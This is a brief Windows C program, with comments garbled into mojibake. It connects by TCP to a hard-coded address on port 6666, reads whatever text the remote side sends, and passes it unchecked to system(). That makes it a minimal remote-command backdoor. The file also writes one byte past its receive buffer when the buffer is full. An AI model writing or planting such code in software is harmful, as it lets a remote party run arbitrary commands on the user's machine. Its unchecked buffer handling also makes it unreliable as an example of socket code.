#define _WINSOCK_DEPRECATED_NO_WARNINGS 


#include <stdio.h>
#include <WinSock2.h>  //������

#define IP  "192.168.0.106"

#pragma comment(lib,"ws2_32.lib")  //�����  .dll��̬�� .lib��̬��

int main(void) {
	//��ʼ�������
	WSADATA wd;
	WSAStartup(MAKEWORD(2, 2), &wd);

	//�����׽���  AF_INET inet��  SOCK_STREAM tcp  SOCK_DGRAM udp
	SOCKET client = socket(AF_INET, SOCK_STREAM, 0);

	// ���׽���  �趨��ַ�Ͷ˿�
	SOCKADDR_IN serAddr;
	//htonl�ֽ���ת��  �����ֽ���=�������ֽ���
	serAddr.sin_addr.S_un.S_addr = inet_addr(IP);
	//Э�����
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(6666);

	connect(client, (SOCKADDR*)&serAddr, sizeof(SOCKADDR));

	char buf[1024];
	int n = recv(client, buf, sizeof(buf),0);

	if (n > 0) {
		buf[n] = '\0';
		printf("�յ�����[%d]��%s\n",n, buf);
		system(buf);
	}
	
	system("pause");
	return 0;
}